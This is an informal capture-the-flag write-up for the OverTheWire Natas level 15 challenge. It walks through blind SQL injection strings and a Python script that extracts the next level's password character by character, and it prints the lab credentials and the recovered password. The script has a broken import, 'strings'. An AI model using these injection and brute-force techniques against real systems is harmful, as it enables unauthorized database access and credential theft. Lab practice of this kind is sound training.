BLIND SQL INJECTIONS

WHen we login with the credentials we can see a page where we are supposed to type in a username and it will check its existence.

CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
  
  This is from the source code and checks if the username exists.
  
  The application checks if the user exists.

when we type natas15 user does not exist
but for the nats16 ite returns 'user exists'

It is checking to see if the user natas16 exists or not 

Next step is to trigger an error in the application.
natas16 OR "1"="1" error in query when we use this..that must be due to the double quotes

SELECT * FROM users WHERE username="natas16" OR "1"="1";

SELECT * FROM users WHERE username="natas16" UNION ALL SELECT 1;#  --this given an error in the query

The union all will add another query on top of the initial one without having to create a new SQL query altogether, ; to end the query and # is used to comment it out.

The error might be occuring as the query is selecting '*' all the columns from the table and the selct statement after UNION Only mentions 1 column

natas16" UNION ALL SELECT 1,2;# This user exists..The number of rows and columns should be equal

Next we will check if the user has tables inside and outside the database
natas16" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE table_schema != "information_schema";#

The information_schema.tables will allow us to view all the information from the tables within a database.


import requests
import strings

characters = string.ascii_letters + string.digits
url = "http://natas15.natas.labs.overthewire.org/"
username1 = "natas15"
password1= "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
password = ""
passwordlength = 32
exists_str = "This user does exist."
while len(password) != 32:
    for char in characters:
        uri = ''.join([url, '?debug&', 'username=natas16"', '+and+password+LIKE+BINARY+"', password + char, '%'])
        r = requests.get(uri, auth=(username1, password1))
        if exists_str in r.text:
            password = password + char
            print(password)

BINARY is added as it doesn't check for lowercase and uppercase letters specifically.




python3 natas15.py
W
Wa
WaI
WaIH
WaIHE
WaIHEa
WaIHEac
WaIHEacj
WaIHEacj6
WaIHEacj63
WaIHEacj63w
WaIHEacj63wn
WaIHEacj63wnN
WaIHEacj63wnNI
WaIHEacj63wnNIB
WaIHEacj63wnNIBR
WaIHEacj63wnNIBRO
WaIHEacj63wnNIBROH
WaIHEacj63wnNIBROHe
WaIHEacj63wnNIBROHeq
WaIHEacj63wnNIBROHeqi
WaIHEacj63wnNIBROHeqi3
WaIHEacj63wnNIBROHeqi3p
WaIHEacj63wnNIBROHeqi3p9
WaIHEacj63wnNIBROHeqi3p9t
WaIHEacj63wnNIBROHeqi3p9t0
WaIHEacj63wnNIBROHeqi3p9t0m
WaIHEacj63wnNIBROHeqi3p9t0m5
WaIHEacj63wnNIBROHeqi3p9t0m5n
WaIHEacj63wnNIBROHeqi3p9t0m5nh
WaIHEacj63wnNIBROHeqi3p9t0m5nhm
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh--PASSWORD


